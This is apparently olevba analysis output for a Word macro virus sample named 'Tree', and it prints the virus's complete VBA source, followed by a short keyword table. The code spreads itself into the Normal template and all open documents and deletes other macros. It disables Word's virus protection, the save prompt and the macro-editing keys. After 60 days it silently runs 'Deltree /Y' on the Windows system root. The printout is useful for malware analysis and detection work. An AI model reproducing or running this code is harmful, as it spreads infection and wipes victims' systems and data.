olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Tree-7d2838db6f9bd044cd50b11f5e7b6f0691d2d4da
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Tree-7d2838db6f9bd044cd50b11f5e7b6f0691d2d4da - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ATree01.bas 
in file: Virus.MSWord.Tree-7d2838db6f9bd044cd50b11f5e7b6f0691d2d4da - OLE stream: 'Macros/VBA/ATree01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileClose()
On Error Resume Next
Call MacNor("ThisDocument", "Reference to Normal", "ATree01")
Call MacDoc("ThisDocument", "Reference to Normal", "ATree01")
Call Woptions("Tools", "Macro", "View", "Toolbars")
Call RegEdCreate
WordBasic.FileClose
End Sub
Sub FileExit()
On Error Resume Next
Call MacNor("ThisDocument", "Reference to Normal", "ATree01")
Call MacDoc("ThisDocument", "Reference to Normal", "ATree01")
Call Woptions("Tools", "Macro", "View", "Toolbars")
Call RegEdCreate
WordBasic.FileExit
End Sub
Sub FileNew()
On Error Resume Next
Call MacNor("ThisDocument", "Reference to Normal", "ATree01")
Call MacDoc("ThisDocument", "Reference to Normal", "ATree01")
Call Woptions("Tools", "Macro", "View", "Toolbars")
Call RegEdCreate
Dialogs(wdDialogFileNew).Show
End Sub
Sub FileOpen()
On Error Resume Next
Call MacNor("ThisDocument", "Reference to Normal", "ATree01")
Call MacDoc("ThisDocument", "Reference to Normal", "ATree01")
Call Woptions("Tools", "Macro", "View", "Toolbars")
Call RegEdCreate
Dialogs(wdDialogFileOpen).Show
End Sub
Sub AutoClose()
On Error Resume Next
Call MacNor("ThisDocument", "Reference to Normal", "ATree01")
Call MacDoc("ThisDocument", "Reference to Normal", "ATree01")
Call Woptions("Tools", "Macro", "View", "Toolbars")
Call RegEdCreate
End Sub
Sub AutoOpen()
On Error Resume Next
Call MacNor("ThisDocument", "Reference to Normal", "ATree01")
Call MacDoc("ThisDocument", "Reference to Normal", "ATree01")
Call Woptions("Tools", "Macro", "View", "Toolbars")
Call RegEdCreate
End Sub
Sub MacNor(D, R, T)
MFN = False
For Each ExistMod In NormalTemplate.VBProject.VBComponents
If ExistMod.Name = T Then MFN = True
If ExistMod.Name <> D And ExistMod.Name <> T Then Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:=ExistMod.Name, Object:=wdOrganizerObjectProjectItems
Next
If MFN = False Then Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=T, Object:=wdOrganizerObjectProjectItems
End Sub
Sub MacDoc(D, R, T)
For Each Doc In Documents
MFD = False
For Each ExistMod In Doc.VBProject.VBComponents
If ExistMod.Name = T Then MFD = True
If ExistMod.Name <> D And ExistMod.Name <> R And ExistMod.Name <> T Then Application.OrganizerDelete Source:=Doc.FullName, Name:=ExistMod.Name, Object:=wdOrganizerObjectProjectItems
Next
If MFD = False Then Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=Doc.FullName, Name:=T, Object:=wdOrganizerObjectProjectItems
Next
End Sub
Sub Woptions(T, M, V, B)
On Error Resume Next
CustomizationContext = ActiveDocument.AttachedTemplate
With Options
.VirusProtection = False
.SaveNormalPrompt = False
End With
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11)).Disable
FindKey(KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8)).Disable
CommandBars(T).Controls(M).Enable = True
CommandBars(T).Controls(M).Delete
CommandBars(V).Controls(B).Enabled = False
CommandBars(V).Controls(B).Caption = "Tree"
End Sub
Sub ViewVBCode()
End Sub
Sub RegEdCreate()
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "TreeInstall")
If Not IsDate(ID) Then
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "TreeInstall") = Format(Date, "dd/mm/yyyy")
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Tree VS Liton"
ID = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "TreeInstall")
End If
CD = Format(Date, "mm/dd/yyyy")
ID = DateValue(ID)
CD = DateValue(CD)
Dv = CD - ID
If Dv > 60 Then
Shell "Deltree /Y " + System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion", "SystemRoot"), vbHide
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

